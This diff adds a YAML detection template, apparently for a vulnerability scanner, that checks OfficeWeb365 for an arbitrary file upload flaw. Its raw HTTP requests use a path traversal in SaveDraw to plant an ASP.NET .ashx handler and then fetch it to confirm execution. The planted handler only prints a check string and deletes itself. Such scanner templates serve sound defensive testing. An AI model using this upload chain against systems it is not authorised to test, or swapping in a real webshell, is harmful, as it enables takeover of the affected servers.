@@ -1,0 +1,41 @@
+id: officeweb365-file-upload
+info:
+  name: OfficeWeb365 File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    OfficeWeb365 contains a file upload vulnerability allowing attackers to upload webshells to the server, gaining control of the server and potentially the entire system.
+  tags: file-upload
+  reference:
+    - https://officeweb365.com/Help/Default
+
+variables:
+  filename: "{{rand_text_alphanumeric(5)}}.ashx"
+  check_str: "{{rand_text_alphanumeric(16)}}"
+
+http:
+  - raw:
+      - |
+        POST /PW/SaveDraw?path=../../Content/img&idx={{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ WebHandler Language="C#" Class="Handler" %>using System;using System.IO;using System.Reflection;using System.Text;using System.Web;using System.Web.SessionState;using System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void ProcessRequest(HttpContext context){try{context.Response.Write("{{check_str}}");File.Delete(context.Request.PhysicalPath);}catch {}}public bool IsReusable{get{return false;}}}"}---
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /Content/img/UserDraw/drawPW{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{check_str}}"
+      - type: status
+        status:
+          - 200
